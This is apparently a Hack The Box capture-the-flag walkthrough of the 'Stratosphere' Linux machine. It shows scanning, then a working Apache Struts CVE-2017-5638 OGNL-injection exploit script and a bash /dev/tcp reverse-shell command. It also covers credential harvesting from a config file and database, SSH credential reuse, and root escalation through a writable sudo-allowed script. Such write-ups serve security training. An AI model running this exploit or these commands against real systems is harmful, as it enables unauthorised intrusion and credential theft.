# Target
| Category          | Details                                                                                  |
|-------------------|------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Stratosphere](https://app.hackthebox.com/machines/Stratosphere)                         |  
| 🏷 **Type**       | HTB Machine                                                                              |
| 🖥 **OS**         | Linux                                                                                    |
| 🎯 **Difficulty** | Medium                                                                                   |
| 📁 **Tags**       | Apache Struts [CVE-2017-5638](https://nvd.nist.gov/vuln/detail/cve-2017-5638), pipeshell |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Stratosphere]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-23 07:16 +0100
Nmap scan report for 10.129.19.222
Host is up (0.029s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA)
|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA)
|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (ED25519)
80/tcp   open  http    Apache Tomcat (language: en)
|_http-title: Stratosphere
8080/tcp open  http    Apache Tomcat (language: en)
|_http-title: Stratosphere
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.40 seconds
```

#### Enumerate web application running at port 80
```
┌──(magicrc㉿perun)-[~/attack/HTB Stratosphere]
└─$ feroxbuster --url http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,js,png,jpg,py,txt,log -C 404       
<SNIP>
302      GET        0l        0w        0c http://10.129.19.222/Monitoring => http://10.129.19.222/Monitoring/
<SNIP>
```
`/Monitoring/` endpoint has been discovered.

#### Access discovered `/Monitoring/` endpoint
```
┌──(magicrc㉿perun)-[~/attack/HTB Stratosphere]
└─$ curl http://$TARGET/Monitoring/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
    <META HTTP-EQUIV="Refresh" CONTENT="0;URL=example/Welcome.action">
</head>

<body>
<p>Loading ...</p>
</body>
</html>
```
We are being redirected to `example/Welcome.action`. `.action` extension might suggest that underlying Java application is using Apache Struts framework.

#### Check if application is vulnerable to [CVE-2017-5638](https://nvd.nist.gov/vuln/detail/cve-2017-5638)
```
┌──(magicrc㉿perun)-[~/attack/HTB Stratosphere]
└─$ git clone -q https://github.com/mazen160/struts-pwn.git && \
./struts-pwn/struts-pwn.py -u http://$TARGET/Monitoring/ --check

[*] URL: http://10.129.19.222/Monitoring/
[*] Status: Vulnerable!
[%] Done.
```

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Stratosphere]
└─$ nc -lvnp 4444
listening on [any] 4444 ..
```

#### Spawn reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Stratosphere]
└─$ ./struts-pwn/struts-pwn.py -u http://$TARGET/Monitoring/ -c "/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
[*] URL: http://10.129.19.222/Monitoring/
[*] CMD: /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.193/4444 0>&1'
<SNIP>
```
Unfortunately, a reverse shell connection could not be established. Further analysis revealed that outbound traffic is filtered on the target system. However, since we can execute commands via the CVE-2017-5638 exploit, we can leverage [pipeshell](https://github.com/magicrc/pipeshell) to create a pseudo-shell and potentially upgrade it to a fully interactive TTY.

#### Extract exploit function from `struts-pwn.py`
```
{ cat <<'EOF' | envsubst > exploit.py             
#!/usr/bin/python3

import sys
import requests

def exploit(cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    headers = {
        'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn)',
        'Content-Type': str(payload),
        'Accept': '*/*'
    }

    timeout = 3
    try:
        output = requests.get("http://$TARGET/Monitoring/", headers=headers, verify=False, timeout=timeout, allow_redirects=False).text
        return output.split('<!DOCTYPE HTML')[0].strip()
    except:
        pass

print(exploit(sys.argv[1]))
EOF
} && chmod +x exploit.py
```

#### Confirm exploit works
```
┌──(magicrc㉿perun)-[~/attack/HTB Stratosphere]
└─$ ./exploit.py 'id'
uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)
```

#### Use `exploit.py` with [pipeshell](https://github.com/magicrc/pipeshell) to spawn FIFO pseudo-shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Stratosphere]
└─$ python3 -m venv .venv && source .venv/bin/activate && pip3 install -qq git+https://github.com/magicrc/pipeshell.git && \
cat <<'EOF'> shell.py && python3 ./shell.py
from pipeshell import PipeShell, ScriptCommandExecutor, Base64CommandStager
PipeShell(ScriptCommandExecutor("./exploit.py", Base64CommandStager()))
EOF
[+] Establishing IPC on target...OK
[+] Session ID: 38600
[+] Shell PID: 2170

┌──(pipesh)─(tomcat8㉿stratosphere)
└─$ id
uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)
```

#### Discover plaintext credentials in `db_connect`
```
┌──(pipesh)─(tomcat8㉿stratosphere)
└─$ cat db_connect
[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin
```
`db_connect` filename suggests that stored credentials are used for database connection.

#### Discover MySQL running on loopback interface
```
┌──(pipesh)─(tomcat8㉿stratosphere)
└─$ ss -ltn
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    
LISTEN    0         80               127.0.0.1:3306             0.0.0.0:*       
LISTEN    0         100                0.0.0.0:8080             0.0.0.0:*       
LISTEN    0         128                0.0.0.0:22               0.0.0.0:*       
LISTEN    0         1                127.0.0.1:8005             0.0.0.0:*       
LISTEN    0         128                   [::]:22                  [::]:*
```

#### Upgrade `pipeshell` to interactive TTY
```
┌──(pipesh)─(tomcat8㉿stratosphere)
└─$ /upgrade

[+] Spawning interactive TTY...
tomcat8@stratosphere:~$ 
```

#### Connect to local MySQL instance
```
tomcat8@stratosphere:~$ mysql -u admin -p
mysql -u admin -p
Enter password: admin

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 36
Server version: 10.3.39-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

#### Discover `richard:9tc*rhKuG5TyXvUJOrE^5CK7k` credentials in `users.accounts` table
```
MariaDB [(none)]> SHOW databases;
SHOW databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| users              |
+--------------------+
2 rows in set (0.003 sec)

MariaDB [(none)]> USE users;
USE users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [users]> SHOW tables;
SHOW tables;
+-----------------+
| Tables_in_users |
+-----------------+
| accounts        |
+-----------------+
1 row in set (0.002 sec)

MariaDB [users]> SELECT * FROM accounts;
SELECT * FROM accounts;
+------------------+---------------------------+----------+
| fullName         | password                  | username |
+------------------+---------------------------+----------+
| Richard F. Smith | 9tc*rhKuG5TyXvUJOrE^5CK7k | richard  |
+------------------+---------------------------+----------+
1 row in set (0.000 sec)
```

#### Reuse discovered credentials to access target over SSH
```
┌──(magicrc㉿perun)-[~/attack/HTB Stratosphere]
└─$ ssh richard@$TARGET
richard@10.129.19.222's password: 
<SNIP>
richard@stratosphere:~$ id
uid=1000(richard) gid=1000(richard) groups=1000(richard),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),116(scanner)
```

#### Capture user flag
```
richard@stratosphere:~$ cat /home/richard/user.txt 
ee70c61d92035ca2c69666ee289c4455
```

### Root flag

#### List allowed `sudo` commands
```
richard@stratosphere:~$ sudo -l
Matching Defaults entries for richard on stratosphere:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
```
Since `/home/richard/test.py` is located in a directory where we have write permissions, we can simply remove it and replace it with a script that spawns a root shell.

#### Replace `test.py` with root shell spawner
```
richard@stratosphere:~$ rm -f /home/richard/test.py && \
{ cat <<'EOF'> test.py
#!/usr/bin/python3
import os

os.system("/bin/bash")
EOF
} && chmod +x test.py
```

#### Use `sudo` to spawn root shell
```
richard@stratosphere:~$ sudo /usr/bin/python /home/richard/test.py
root@stratosphere:/home/richard# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture root flag
```
root@stratosphere:/home/richard# cat /root/root.txt
48f27be516bd342049c2cfa8e4958277
```
